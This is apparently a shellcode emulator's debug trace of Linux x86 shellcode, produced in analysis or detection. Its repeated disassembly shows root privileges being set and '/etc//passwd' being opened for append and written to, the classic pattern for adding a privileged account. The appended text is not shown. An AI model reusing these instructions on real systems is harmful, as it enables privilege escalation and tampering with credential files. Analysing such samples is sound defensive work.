[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05e128 471015: 2F                              das  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657173 00471015
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657173 471015 steps 18
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657176 00471018
[emu 0x0xa057378 [31;1mdebug[0m ] error at 61                              popa  (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 61                              popa 
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471018
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa088bc8 471018
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657176 471018 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657167 0047100f
[emu 0x0xa057378 [31;1mdebug[0m ] 6873737764                      push dword 0x64777373
[emu 0x0xa057378 [31;1mdebug[0m ] 682F2F7061                      push dword 0x61702f2f
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa087238 47100f
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657167 47100f steps 17
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657168 00471010
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 73                              jnc 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471010
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05dab8 471010: 73                              jnc 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657168 00471010
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657168 471010 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657162 0047100a
[emu 0x0xa057378 [31;1mdebug[0m ] 055831C951                      add eax,0x51c93158
[emu 0x0xa057378 [31;1mdebug[0m ] 6873737764                      push dword 0x64777373
[emu 0x0xa057378 [31;1mdebug[0m ] 682F2F7061                      push dword 0x61702f2f
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa083020 47100a
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657162 47100a steps 18
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657166 0047100e
[emu 0x0xa057378 [31;1mdebug[0m ] 51                              push ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 6873737764                      push dword 0x64777373
[emu 0x0xa057378 [31;1mdebug[0m ] 682F2F7061                      push dword 0x61702f2f
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa081870 47100e
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657166 47100e steps 18
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657164 0047100c
[emu 0x0xa057378 [31;1mdebug[0m ] 31C9                            xor ecx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 51                              push ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 6873737764                      push dword 0x64777373
[emu 0x0xa057378 [31;1mdebug[0m ] 682F2F7061                      push dword 0x61702f2f
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa0800a8 47100c
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657164 47100c steps 19
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657165 0047100d
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr C9                              leave 
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 0047100d
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa07d7e0 47100d
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657165 47100d steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657160 00471008
[emu 0x0xa057378 [31;1mdebug[0m ] error at 806A0558                        sub byte [edx+0x5],0x58 (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 806A0558                        sub byte [edx+0x5],0x58
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471008
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa07ae88 471008
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657160 471008 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657158 00471006
[emu 0x0xa057378 [31;1mdebug[0m ] error at 58                              pop eax (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471006
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05ce58 471006: 58                              pop eax 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05cc80 471005 46                              inc esi
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657158 00471006
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] Known Again 0xa05cc80 471005
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657158 471006 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657154 00471002
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 89CB                            mov ebx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471002
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05caa8 471002: 89CB                            mov ebx,ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05c790 471000 31C9                            xor ecx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05c938 471001 C9                              leave 
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657154 00471002
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] Known Again 0xa05c790 471000
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] Known Again 0xa05c938 471001
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657154 471002 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657157 00471005
[emu 0x0xa057378 [31;1mdebug[0m ] 46                              inc esi
[emu 0x0xa057378 [31;1mdebug[0m ] error at 58                              pop eax (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471006
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa073408 471005
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657157 471005 steps 1
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657152 00471000
[emu 0x0xa057378 [31;1mdebug[0m ] 31C9                            xor ecx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 89CB                            mov ebx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 6A46                            push byte 0x46
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A05                            push byte 0x5
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] 31C9                            xor ecx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 51                              push ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 6873737764                      push dword 0x64777373
[emu 0x0xa057378 [31;1mdebug[0m ] 682F2F7061                      push dword 0x61702f2f
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa071e28 471000
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657152 471000 steps 26
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657153 00471001
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr C9                              leave 
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471001
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa09cef0 471001
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657153 471001 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657185 00471021
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa09ceb0 471021
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657185 471021 steps 12
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657182 0047101e
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa09ceb0 47101e
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657182 47101e steps 14
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657178 0047101a
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [31;1mdebug[0m ] 2F                              das 
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 6574                            ?? jz 0x2
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 0047101b
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa091330 47101a
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657178 47101a steps 1
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657169 00471011
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 73                              jnc 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471011
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa06f8a0 471011
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657169 471011 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657173 00471015
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [31;1mdebug[0m ] 2F                              das 
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [31;1mdebug[0m ] 2F                              das 
[emu 0x0xa057378 [31;1mdebug[0m ] 70                              jo 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa06e1a8 471015
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657173 471015 steps 18
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657168 00471010
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 73                              jnc 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471010
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa06bb08 471010
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657168 471010 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657158 00471006
[emu 0x0xa057378 [31;1mdebug[0m ] error at 58                              pop eax (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471006
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa09a708 471006
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657158 471006 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657154 00471002
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 89CB                            mov ebx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471002
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa08ed00 471002
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657154 471002 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471000 steps 26
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047100c steps 19
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047100a steps 18
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047100e steps 18
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471015 steps 18
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047100f steps 17
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471014 steps 16
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471019 steps 15
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047101e steps 14
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471021 steps 12
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471026 steps 9
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047101f steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047101a steps 1
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047101c steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471011 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471018 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471010 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047100d steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471008 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471006 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471002 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471005 steps 1
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471001 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x0047101a steps 1
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471011 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471010 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471006 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] b offset 0x00471002 steps 0
[31;1mfailed[0m
[emu 0x0xa044078 [31;1mdebug[0m ] cpu state    eip=0xfffa5fff
[emu 0x0xa044078 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0xa044078 [31;1mdebug[0m ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xa044078 [31;1mdebug[0m ] Flags: 
[emu 0x0xa044078 [31;1mdebug[0m ] cpu state    eip=0xfffa5fff
[emu 0x0xa044078 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0xa044078 [31;1mdebug[0m ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xa044078 [31;1mdebug[0m ] Flags: 
[emu 0x0xa044078 [31;1mdebug[0m ] 0100                            add [eax],eax
cpu error error accessing 0x00000004 not mapped

stepcount 0
[emu 0x0xa044078 [31;1mdebug[0m ] cpu state    eip=0xfffa6000
[emu 0x0xa044078 [31;1mdebug[0m ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0xa044078 [31;1mdebug[0m ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0xa044078 [31;1mdebug[0m ] Flags: 
